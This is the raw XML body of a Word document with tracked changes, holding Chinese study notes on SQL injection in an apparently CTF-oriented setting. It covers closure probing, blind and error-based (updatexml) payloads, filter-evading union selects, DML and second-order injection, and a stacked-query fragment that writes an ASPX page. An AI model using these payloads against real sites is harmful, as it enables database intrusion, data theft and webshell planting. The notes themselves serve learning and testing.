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0" w:author="rj f" w:date="2017-06-20T11:55:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1" w:author="rj f" w:date="2017-06-20T11:55:00Z">
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>1=1</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>和</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>1=2</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>返回不同说明存在注入漏洞</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:tab/>
          <w:delText>//</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>盲注</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:delText>测试</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>，</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:delText>针对</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:delText>’</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>过滤</w:delText>
        </w:r>
      </w:del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2" w:author="rj f" w:date="2017-06-20T11:55:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3" w:author="rj f" w:date="2017-06-20T11:55:00Z">
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>单引号</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>'</w:delText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rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>//</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>基本</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:delText>注入测试</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00DD2A2D" w:rsidDel="003215E6" w:rsidRDefault="00DD2A2D" w:rsidP="00DD2A2D">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:del w:id="4" w:author="rj f" w:date="2017-06-20T11:55:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="5" w:author="rj f" w:date="2017-06-20T11:55:00Z">
        <w:r w:rsidDel="003215E6">
          <w:delText>U</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText xml:space="preserve">nion </w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:delText>select</w:delText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  <w:delText>//</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>联合</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:delText>查询注入测试</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>，</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:delText>针对</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:delText>and</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>关键字过滤</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="003215E6" w:rsidRDefault="003215E6" w:rsidP="00DD2A2D">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:ins w:id="6" w:author="rj f" w:date="2017-06-20T11:56:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="7" w:author="rj f" w:date="2017-06-20T11:55:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>单引号是否</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="8" w:author="rj f" w:date="2017-06-20T11:56:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>报错确认可能的注入点；</w:t>
        </w:r>
        <w:r w:rsidR="007D1D00">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve">-- </w:t>
        </w:r>
        <w:r w:rsidR="007D1D00">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>一般如果这一步确认了就可以直接用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跑了，</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="9" w:author="rj f" w:date="2017-06-20T11:57:00Z">
        <w:r w:rsidR="007D1D00">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>如果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跑不出来再尝试手工</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="003215E6" w:rsidRDefault="008E15BD" w:rsidP="00DD2A2D">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:ins w:id="10" w:author="rj f" w:date="2017-06-20T11:57:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="11" w:author="rj f" w:date="2017-06-20T11:57:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>利用</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>bool (blind)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>注入测试，确认</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>SQL</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>的闭合类型；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2" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="13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4" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
        <w:r>
          <w:t>d=1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5" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="16" w:author="rj f" w:date="2017-06-20T11:58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7" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1)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8" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="19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0" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1))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1" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="22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3" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1’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4" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="25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6" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1’)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7" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="28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9" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1’))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0" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="31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2" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1”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3" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="34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5" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1”)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6" w:author="rj f" w:date="2017-06-20T11:59:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="37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8" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1”)) and 1=1/2</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="007319AD" w:rsidRDefault="007319AD">
      <w:pPr>
        <w:rPr>
          <w:ins w:id="39" w:author="rj f" w:date="2017-06-20T12:00:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="40" w:author="rj f" w:date="2017-06-20T11:59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41" w:author="rj f" w:date="2017-06-20T11:59:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>根据是否有正确</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="42" w:author="rj f" w:date="2017-06-20T12:00:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>错误的反馈，选择合适的手工注入方式。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="007319AD" w:rsidRDefault="007319AD" w:rsidP="007319AD">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:ins w:id="43" w:author="rj f" w:date="2017-06-20T11:55:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="44" w:author="rj f" w:date="2017-06-20T12:00:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>没有任何正确</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>错误的反馈，选择</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>time (blind)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>注入</w:t>
        </w:r>
        <w:r w:rsidR="00FA71E0">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>，需要</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="45" w:author="rj f" w:date="2017-06-20T12:01:00Z">
        <w:r w:rsidR="00FA71E0">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>尝试步骤</w:t>
        </w:r>
        <w:r w:rsidR="00FA71E0">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r w:rsidR="00FA71E0">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>中的所有情况。</w:t>
        </w:r>
      </w:ins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BA22DE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E362ED" w:rsidP="00162020">
      <w:pPr>
        <w:ind w:left="420" w:firstLine="420"/>
      </w:pPr>
      <w:r w:rsidRPr="00E362ED">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
        </w:rPr>
        <w:t>MYSQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00E362ED">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
        </w:rPr>
        <w:t>类型转换</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00E362ED">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
        </w:rPr>
        <w:t>解释</w:t>
      </w:r>
      <w:r w:rsidR="00162020">
        <w:t>：</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在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中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>同时操作字符串和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>时</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>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会尝试将</w:t>
      </w:r>
      <w:r w:rsidR="008B48E4">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r w:rsidR="008B48E4">
        <w:t>archar</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>转换为数字类型（</w:t>
      </w:r>
      <w:r w:rsidR="003E075C">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>取</w:t>
      </w:r>
      <w:r w:rsidR="003E075C">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>varchar</w:t>
      </w:r>
      <w:r w:rsidR="003E075C">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>最前面的数字作为</w:t>
      </w:r>
      <w:r w:rsidR="003E075C">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:r w:rsidR="003E075C">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的值</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00E359AB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如果没有，</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>就当做数字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处理）。如’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+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22</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>′，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将“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”转成数字</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在进行运算；</w:t>
      </w:r>
      <w:r w:rsidR="006A5654">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>而</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>将“</w:t>
      </w:r>
      <w:r w:rsidR="006A5654">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>xyz</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00162020">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”当做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处理。</w:t>
      </w:r>
      <w:r w:rsidR="00F20096" w:rsidRPr="00F20096">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>小技巧</w:t>
      </w:r>
      <w:r w:rsidR="00F20096">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：在注入时，使用</w:t>
      </w:r>
      <w:r w:rsidR="00F20096">
        <w:t>’str’^1^1</w:t>
      </w:r>
      <w:r w:rsidR="00F20096">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>将字符串强制转换为</w:t>
      </w:r>
      <w:r w:rsidR="00F20096">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="00F20096">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="006B7F02" w:rsidRDefault="000F184C" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="006B7F02">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr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BA22DE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BA22DE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CA0CA4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CA0CA4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CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r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BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>拓展存储注入攻击：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr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CA0CA4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CA0CA4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CA0CA4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CA0CA4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>;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID 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>;insert into test(str)values ('&lt;%@ Page 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BA22DE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CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr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CA0CA4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CA0CA4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BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF7040">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/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CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr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CA0CA4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F517F1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CA0CA4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CA0CA4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 xml:space="preserve">aNd 1=2 uNion SelEct 1,2,gRoUp_coNcAt(SCHEMA_NAME),4,5  fRom </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>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CA0CA4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CA0CA4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CA0CA4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CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr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BA22DE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812AAA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 xml:space="preserve">length() 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ascii(‘A’) ord(65)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char(77, 121, 83, 81, 76)---MySQL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812AAA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BA22DE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CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr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CA0CA4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F517F1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F517F1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F517F1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F517F1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F517F1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CA0CA4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CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r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BA22DE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lastRenderedPageBreak/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BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr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BA22DE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4157B8" w:rsidRDefault="004157B8" w:rsidP="004157B8">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>其实</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中有很多种</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>error-based</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入，这里只列出了几种。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A64139" w:rsidRDefault="00C31FF2" w:rsidP="009E588F">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="62"/>
        </w:numPr>
      </w:pPr>
      <w:r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CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr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812AAA" w:rsidRDefault="00812AAA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812AAA" w:rsidRDefault="00812AAA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12AAA" w:rsidRDefault="00812AAA" w:rsidP="00414F9E"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812AAA" w:rsidRDefault="00812AAA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812AAA" w:rsidRDefault="00812AAA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12AAA" w:rsidRDefault="00812AAA" w:rsidP="00414F9E"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Default="00CA0CA4" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>updatexml</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CA0CA4" w:rsidRPr="00351730" w:rsidRDefault="0034523C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23C" w:rsidRDefault="0034523C">
                            <w:r>
                              <w:t>or updatexml(1,concat(0x7e,database())</w:t>
                            </w:r>
                            <w:r w:rsidR="009B3905">
                              <w:t>,0</w:t>
                            </w:r>
                            <w:r>
                              <w:t>)</w:t>
                            </w:r>
                            <w:r w:rsidR="00012075">
                              <w:t>%23</w:t>
                            </w:r>
                          </w:p>
                          <w:p w:rsidR="004B76BA" w:rsidRPr="004B76BA" w:rsidRDefault="004B76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or updatexml(1,concat(0x7e,</w:t>
                            </w:r>
                            <w:r>
                              <w:t>(select flag from flag</w:t>
                            </w:r>
                            <w:bookmarkStart w:id="46" w:name="_GoBack"/>
                            <w:bookmarkEnd w:id="46"/>
                            <w:r>
                              <w:t>),0)%23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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w:rsidR="0034523C" w:rsidRDefault="0034523C">
                      <w:r>
                        <w:t>or updatexml(1,concat(0x7e,database())</w:t>
                      </w:r>
                      <w:r w:rsidR="009B3905">
                        <w:t>,0</w:t>
                      </w:r>
                      <w:r>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidR="00012075">
                        <w:t>%23</w:t>
                      </w:r>
                    </w:p>
                    <w:p w:rsidR="004B76BA" w:rsidRPr="004B76BA" w:rsidRDefault="004B76BA">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:t>or updatexml(1,concat(0x7e,</w:t>
                      </w:r>
                      <w:r>
                        <w:t>(select flag from flag</w:t>
                      </w:r>
                      <w:bookmarkStart w:id="47" w:name="_GoBack"/>
                      <w:bookmarkEnd w:id="47"/>
                      <w:r>
                        <w:t>),0)%23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139" w:rsidRDefault="00A64139" w:rsidP="00372F6A"/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9E588F">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>字符型和数字型的基本原理</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005071EC" w:rsidRDefault="001A53B5" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr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377B7F" w:rsidRDefault="00812AAA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812AAA" w:rsidRPr="00D3129B" w:rsidRDefault="00812AAA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HCyor4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812AAA" w:rsidRPr="00377B7F" w:rsidRDefault="00812AAA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812AAA" w:rsidRPr="00D3129B" w:rsidRDefault="00812AAA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CA0CA4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1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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w:rsidR="00812AAA" w:rsidRDefault="00812AAA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812AAA" w:rsidRPr="00264C7E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2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OR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rNjv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NWbM5E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812AAA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812AAA" w:rsidRPr="00264C7E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BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00A64139">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr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E173A6" w:rsidRDefault="00E173A6" w:rsidP="00D77A34">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>针对</w:t>
      </w:r>
      <w:r>
        <w:t>DML</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句的注入</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E173A6" w:rsidRDefault="00E173A6" w:rsidP="00E173A6">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>不仅是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句，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语句同样可以进行注入。</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>对于这类</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>DML</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句的注入，一般方法都是将</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句构造成“</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>or (</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>子查询语句</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”的形式。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB0AB3" w:rsidRDefault="00BB0AB3" w:rsidP="00BB0AB3">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="63"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>二次查询注入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mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中没有二次查询，所以采用子查询。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB0AB3" w:rsidRDefault="00BB0AB3" w:rsidP="00BB0AB3">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
